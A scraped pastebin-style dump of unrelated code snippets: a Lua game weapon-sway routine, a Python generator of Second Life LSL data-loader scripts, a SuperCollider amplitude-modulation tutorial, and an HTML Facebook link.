    ang.r = ang.r - recoil_amt * self.RecoilVisualAngles.r 

    pos = pos + ( recoil_amt * self.RecoilVisualVector.y) * ang:Forward()
    pos = pos + ( recoil_amt * self.RecoilVisualVector.z) * ang:Up()
    --pos = pos + ( ( self.Blowback + recoil_amt)  * math.sin(ct * 12) *self.RecoilVisualVector.x) * ang:Right()

    ang.r = ang.r - (recoil_amt*4) * math.sin(ct * 256) * self.RecoilVisualWobbleModel.x
    ang.y = ang.y - (recoil_amt*2) * math.sin(ct * 256) * self.RecoilVisualWobbleModel.y

    ec_move = Lerp(RealFrameTime()*1, ec_move or 0, movepercent) * 0.75
    
    if ec_move > 0 then
        angles.y = angles.y - math.sin(ct*8 )*1.3*ec_move*1.5
        angles.p = angles.p - math.sin(ct*16.8 )*0.8*ec_move*1.5
        angles.r = angles.r - math.cos(ct*8.4 )*0.2*ec_move*16
        pos = pos + math.sin(ct*8 )*1.3*ec_move*1.5 * ang:Forward()
    end   

    ang:RotateAroundAxis(ang:Right(), -angles.p)
    ang:RotateAroundAxis(ang:Up(), -angles.y)
    ang:RotateAroundAxis(ang:Forward(), -angles.r)

    MouseDeltaX = math.Clamp(MouseDeltaX, -16, 16) * self.SwayMod
    ec_mouse = Lerp(RealFrameTime()*6, ec_mouse or 0, MouseDeltaX)
    angles.r = angles.r + ec_mouse * 0.05
    angles.y = angles.y + ec_mouse * 0.02
    
    MouseDeltaY = math.Clamp(MouseDeltaY, -16, 16) * self.SwayMod
    ec_mouse2 = Lerp(RealFrameTime()*6, ec_mouse2 or 0, MouseDeltaY)
    angles.p = angles.p - ec_mouse2 * 0.05

    ang:RotateAroundAxis(ang:Right(), -angles.p)
    ang:RotateAroundAxis(ang:Up(), -angles.y)
    ang:RotateAroundAxis(ang:Forward(), -angles.r)

    pos = pos + (ec_mouse2 * 0.1) * ang:Up() 
    pos = pos + (ec_mouse * 0.1) * ang:Right() 
"
Sj9CdWRn,Untitled,ValkyrieJanet,Linden Scripting,Monday 15th of January 2024 02:23:14 PM CDT,"

# VtFileWriter begins here
class VtFileWriter:
    def __init__(self, vertices, path, base_name, size):
        self.vertices = vertices
        self.path = path
        self.base_name = base_name
        self.size = size

    def write_files(self):
        coords = tuple(v.co for v in self.vertices)
        triples = tuple(coords[i:i + 3] for i in range(0, len(coords) - 1, 2))
        all_lines = self.make_lines(triples)
        count = ceil(len(triples)/self.size)
        for file_number in range(count):
            start = file_number*self.size
            end = (file_number+1)*self.size
            lines = all_lines[start:end]
            name = [self.base_name, str(file_number)]
            file_name = ""_"".join(name) + "".lsl""
            full_path = os.path.join(self.path, file_name)
            with open(full_path, ""w"") as file:
                self.write_one_file(file_name, file_number, count, lines, file)
                print(f""File was written to {full_path}\n"")

    def write_one_file(self, file_name, file_number, file_count, lines, file):
        from datetime import datetime
        now = datetime.now()
        file.write(f""// {file_name}\n"")
        time = now.strftime(""%Y-%m-%d %H:%M:%S"")
        file.write(f""// {time}\n"")
        file.write(""//    created by VtFileWriter\n"")
        file.write(""//    JR 20240115 - inert, last sends LOADING_DONE\n"")
        file.write(""//    Script names do not matter.\n\n"")
        file.write(f""integer SCRIPT_NUMBER = {file_number};\n"")
        file.write(f""integer LAST_SCRIPT_NUMBER= {file_count-1};\n"")
        file.write(f""integer CHUNK_SIZE = {self.size};\n\n"")
        file.write(""list data = [\n"")
        text = ""\n,"".join(lines)
        file.write(text)
        file.write(""\n];\n"")
        file.write(self.fixed_part)

    @staticmethod
    def make_lines(coordinate_triples):
        lines = []
        back_zero = coordinate_triples[0][0]
        for back, up, front in coordinate_triples:
            back_zeroed = back - back_zero
            roll = Vehicle(back, up, front).roll_degrees()
            output = f""<{back_zeroed.x:.3f}, {back_zeroed.y:.3f}, {back_zeroed.z:.3f}, {roll:.0f}>""
            lines.append(output)
        return lines

    fixed_part = """"""
// nothing varies from here on down

write_data() {
    integer limit = llGetListLength(data);
    integer out_key = CHUNK_SIZE*SCRIPT_NUMBER;
    integer end_key = out_key + limit;
    llSay(0, llGetScriptName() + "" writing "" + (string) out_key + "" up to "" + (string) end_key);
    integer index;
    for (index = 0; index < limit; index++, out_key++) {
        llLinksetDataWrite(""datakey""+(string) out_key,  llList2String( data , index));
    }
    if (SCRIPT_NUMBER == LAST_SCRIPT_NUMBER) {
        integer keyCount = llLinksetDataCountKeys(); 
        llSay(0, ""SIGNALLING LOADING_DONE "" + (string) keyCount);
        llMessageLinked(LINK_THIS, keyCount, ""LOADING_DONE"", NULL_KEY);
    } else {
        llMessageLinked(LINK_THIS, SCRIPT_NUMBER + 1, ""LOADING"", NULL_KEY);
    }
}

default {
    on_rez(integer start_param) {
        llResetScript();
    }

    state_entry() {
    }

    link_message(integer sender_num, integer num, string str, key id) {
        if (str != ""LOADING"") return;
        if (num != SCRIPT_NUMBER) return;
        if (SCRIPT_NUMBER == 0) {
            llLinksetDataReset();
            llSay(0, ""SCRIPT 0 Resetting LSD"");
        }
        write_data();
    }
}
""""""

# VtFileWriter ends here"
1gvYHvnj,Dynamic Expression (Part 2),SoundEngraver,SuperCollider,Monday 15th of January 2024 01:59:03 PM CDT,"//////////////////////////  Dynamic Amplitude, Part 2 //////////////////////////

// For a demonstration on YouTube: https://youtu.be/buGL7ELgwoc?si=HsHBJxHRFeBztKaO

s.boot;

s.meter;
s.scope;
s.plotTree;

s.reboot;
s.quit;


(
~triAmp = {
	var sig;
	sig = LFTri.ar(300, 0, 0.01)!2;
}.play;
)

~triAmp.free;

// Adding arguments.

(
~triAmp = {
	arg freq=300, amp=0.03;
	var sig;
	sig = LFTri.ar(freq, 0, amp)!2;
}.play;
)

~triAmp.free;

// Adding variables to control the frequency modulation in the sawtooth wave.

(
~triAmp = {
	arg freq=300, amp=0.03;
	var sig, freqNoise;
	freqNoise = LFNoise0.kr(8).range(100, 1000);
	sig = LFTri.ar(freqNoise, 0, amp)!2;
}.play;
)

~triAmp.free;

// Add another variable for amplitude modulation.

(
~triAmp = {
	arg sine=1, noise=4;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(0.001, 0.3);
	freqNoise = LFNoise0.kr(noise).range(100, 1000);
	sig = LFTri.ar(freqNoise, 0, modAmp)!2;
}.play
)

~triAmp.set(\sine, 1/8);
~triAmp.set(\noise, 9);

~triAmp.free;


(
~triAmp = {
	arg sine=1, noise=4, modMin=0.001, modMax=0.3,
	freqMin=100, freqMax=1000;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(modMin, modMax);
	freqNoise = LFNoise0.kr(noise).range(freqMin, freqMax);
	sig = LFTri.ar(freqNoise, 0, modAmp)!2;
}.play
)


~triAmp.set(\sine, 1/4);
~triAmp.set(\noise, 18);
~triAmp.set(\modMin, 0.01);
~triAmp.set(\modMax, 0.2);

~triAmp.free;


// CAUTION: Be very careful using an amplitude modulator using things other than SinOsc. Pulse.ar, for example, stacks amplitude instances one after the other when you use a width modulation.
// Same with Saw.

// SinOsc

(
~sineAmp = {
	arg sine=1, noise=4;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(0.001, 0.1);
	freqNoise = SinOsc.kr(noise).range(100, 1000);
	sig = SinOsc.ar(freqNoise, 0, modAmp)!2;
}.play
)

~sineAmp.set(\sine, 6);
~sineAmp.set(\noise, 2);

~sineAmp.free;

// LFSaw

(
~sawAmp = {
	arg sine=1, noise=4;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(0.001, 0.1);
	freqNoise = SinOsc.kr(noise).range(100, 1000);
	sig = LFSaw.ar(freqNoise, 0, modAmp)!2;
}.play
)

~sawAmp.set(\sine, 1/8);
~sawAmp.set(\noise, 7);

~sawAmp.free;

// LFTri

(
~triAmp = {
	arg sine=1, noise=4;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(0.001, 0.1);
	freqNoise = SinOsc.kr(noise).range(100, 1000);
	sig = LFTri.ar(freqNoise, 0, modAmp)!2;
}.play
)

~triAmp.set(\sine, 8);
~triAmp.set(\noise, 20);

~triAmp.free;

// LFPar

(
~parAmp = {
	arg sine=1, noise=4;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(0.001, 0.1);
	freqNoise = SinOsc.kr(noise).range(100, 1000);
	sig = LFPar.ar(freqNoise, 0, modAmp)!2;
}.play
)

~parAmp.set(\sine, 1/4);
~parAmp.set(\noise, 12);

~parAmp.free;

// Pulse

(
~pulseTest = {
	arg sine=1, noise=4;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(0.001, 0.1);
	freqNoise = SinOsc.kr(noise).range(100, 1000);
	sig = Pulse.ar(freqNoise, 0.5, modAmp)!2;
}.play
)

~pulseTest.set(\sine, 1/8);
~pulseTest.set(\noise, 1);

~pulseTest.free;

// LFPulse

(
~pulseAmp = {
	arg sine=1, noise=4;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(0.001, 0.1);
	freqNoise = SinOsc.kr(noise).range(100, 1000);
	sig = LFPulse.ar(freqNoise, 0, 0.5, modAmp)!2;
}.play
)

~pulseAmp.set(\sine, 8);
~pulseAmp.set(\noise, 20);

~pulseAmp.free;

// LFCub

(
~cubAmp = {
	arg sine=1, noise=4;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(0.001, 0.1);
	freqNoise = SinOsc.kr(noise).range(100, 1000);
	sig = LFCub.ar(freqNoise, 0, modAmp)!2;
}.play
)

~cubAmp.set(\sine, 12);
~cubAmp.set(\noise, 1);

~cubAmp.free;

// Saw

(
~sawTest = {
	arg sine=1, noise=4;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(0.001, 0.1);
	freqNoise = SinOsc.kr(noise).range(100, 1000);
	sig = Saw.ar(freqNoise, modAmp)!2;
}.play
)

~sawTest.set(\sine, 8);
~sawTest.set(\noise, 1/2);

~sawTest.free;

// VarSaw

(
~varAmp = {
	arg sine=1, noise=4;
	var sig, freqNoise, modAmp;
	modAmp = SinOsc.kr(sine).exprange(0.001, 0.1);
	freqNoise = SinOsc.kr(noise).range(100, 1000);
	sig = VarSaw.ar(freqNoise, 0, 0.5, modAmp)!2; // Don't forget the width argument!
}.play
)

~varAmp.set(\sine, 1/2);
~varAmp.set(\noise, 1/16);

~varAmp.free;


// Apply this to noise.

(
~pinkNoise = {
	arg freq=0.25, amp=0.2;
	var sig, mod;
	mod = SinOsc.ar(freq: freq, phase: pi, mul: 0.5, add: 0.5);
	sig = PinkNoise.ar(amp)!2; // Go between PinkNoise and BrownNoise.
	sig = sig * mod;
};
)

x = ~pinkNoise.play;
x.release(8);

(
~pinkNoiseCtrl = {
	arg sine=4, amp=1;
	var sig, modAmp;
	modAmp = LFPar.kr(sine).exprange(0.001, 0.1);
	// Change waveform (e.g, LFTri, LFSaw, etc.)
	sig = PinkNoise.ar(amp)!2;
	sig = sig * modAmp;
}.play
)

~pinkNoiseCtrl.set(\sine, 3);
~pinkNoiseCtrl.free;


// Add Sound File

~ice = Buffer.read(s, ""/Users/devicename/Desktop/soundfilename.wav""); --> for your sound files

~ice.play;
~ice.free;

~ice.duration;
~ice.numChannels;


// Play Synth

(
~ice = SynthDef.new(\play, {
	arg amp=1, atk=0.001, rel=3, c1=1, c2(-1),
	buf=0, rate=1, spos=0, pan=0, out=0;
	var sig, env;
	env = Env([0, 1, 0], [atk, rel], [c1, c2]).kr(2);
	sig = PlayBuf.ar(2, buf, rate, startPos: spos);
	sig = sig * env;
	pan = Pan2.ar(sig, pan, amp);
	Out.ar(out, sig);
}).add;
)

~ice.play;

// Replace the Envelope variable with a modulator.

// SinOsc

(
~iceSine = SynthDef.new(\play, {
	arg sine=1, minAmp=0.001, maxAmp=1,
	buf=0, rate=1, spos=0, pan=0, amp=1, out=0;
	var sig, modAmp;
	modAmp = SinOsc.kr(sine).exprange(minAmp, maxAmp);
	sig = PlayBuf.ar(2, buf, rate, startPos: spos);
	sig = sig * modAmp;
	pan = Pan2.ar(sig, pan, amp);
	Out.ar(out, sig);
}).add;
)

~iceSine = Synth(\play, [\buf, ~ice]);

~iceSine.set(\sine, 1/4);
~iceSine.free;

// Saw

(
~iceSaw = SynthDef.new(\play, {
	arg saw=1, minAmp=0.001, maxAmp=1,
	buf=0, rate=1, spos=0, pan=0, amp=1, out=0;
	var sig, modAmp;
	modAmp = Saw.kr(saw).exprange(minAmp, maxAmp);
	sig = PlayBuf.ar(2, buf, rate, startPos: spos);
	sig = sig * modAmp;
	pan = Pan2.ar(sig, pan, amp);
	Out.ar(out, sig);
}).add;
)

~iceSaw = Synth(\play, [\buf, ~ice]);

~iceSaw.set(\saw, 15);
~iceSaw.free;

// LFSaw

(
~iceLFSaw = SynthDef.new(\play, {
	arg lowSaw=1, minAmp=0.001, maxAmp=0.8,
	buf=0, rate=1, spos=0, pan=0, amp=1, out=0;
	var sig, modAmp;
	modAmp = LFSaw.kr(lowSaw).exprange(minAmp, maxAmp);
	sig = PlayBuf.ar(2, buf, rate, startPos: spos);
	sig = sig * modAmp;
	pan = Pan2.ar(sig, pan, amp);
	Out.ar(out, sig);
}).add;
)

~iceLFSaw = Synth(\play, [\buf, ~ice]);

~iceLFSaw.set(\lowSaw, 32);
~iceLFSaw.free;

// LFTri

(
~iceTri = SynthDef.new(\play, {
	arg tri=1, minAmp=0.001, maxAmp=0.8,
	buf=0, rate=1, spos=0, pan=0, amp=1, out=0;
	var sig, modAmp;
	modAmp = LFTri.kr(tri).exprange(minAmp, maxAmp);
	sig = PlayBuf.ar(2, buf, rate, startPos: spos);
	sig = sig * modAmp;
	pan = Pan2.ar(sig, pan, amp);
	Out.ar(out, sig);
}).add;
)

~iceTri = Synth(\play, [\buf, ~ice]);

~iceTri.set(\tri, 20);
~iceTri.free;

// LFCub

(
~iceCube = SynthDef.new(\play, {
	arg cube=1, minAmp=0.001, maxAmp=0.8,
	buf=0, rate=1, spos=0, pan=0, amp=1, out=0;
	var sig, modAmp;
	modAmp = LFCub.kr(cube).exprange(minAmp, maxAmp);
	sig = PlayBuf.ar(2, buf, rate, startPos: spos);
	sig = sig * modAmp;
	pan = Pan2.ar(sig, pan, amp);
	Out.ar(out, sig);
}).add;
)

~iceCube = Synth(\play, [\buf, ~ice]);

~iceCube.set(\cube, 2);
~iceCube.free;

// VarSaw

(
~iceVarSaw = SynthDef.new(\play, {
	arg varSaw=1, minAmp=0.001, maxAmp=0.8,
	buf=0, rate=1, spos=0, pan=0, amp=1, out=0;
	var sig, modAmp;
	modAmp = VarSaw.kr(varSaw).exprange(minAmp, maxAmp);
	sig = PlayBuf.ar(2, buf, rate, startPos: spos);
	sig = sig * modAmp;
	pan = Pan2.ar(sig, pan, amp);
	Out.ar(out, sig);
}).add;
)

~iceVarSaw = Synth(\play, [\buf, ~ice]);

~iceVarSaw.set(\varSaw, 1/16);
~iceVarSaw.free;

// LFPulse

(
~icePulse = SynthDef.new(\play, {
	arg pulse=1, minAmp=0.001, maxAmp=0.1,
	buf=0, rate=1, spos=0, pan=0, amp=1, out=0;
	var sig, modAmp;
	modAmp = LFPulse.kr(pulse).exprange(minAmp, maxAmp);
	sig = PlayBuf.ar(2, buf, rate, startPos: spos);
	sig = sig * modAmp;
	pan = Pan2.ar(sig, pan, amp);
	Out.ar(out, sig);
}).add;
)

~icePulse = Synth(\play, [\buf, ~ice]);

~icePulse.set(\pulse, 24); // an idea for bypassing?
~icePulse.free;"
CHAkVSvf,Link Purpose - WAVE,israelcefrin,HTML,Monday 15th of January 2024 01:49:06 PM CDT,"<a href=""""https://www.facebook.com/UniversityofWaterlooLibrary"""">
<i class=""""fa fa-facebook-official""""></i>
</a>"
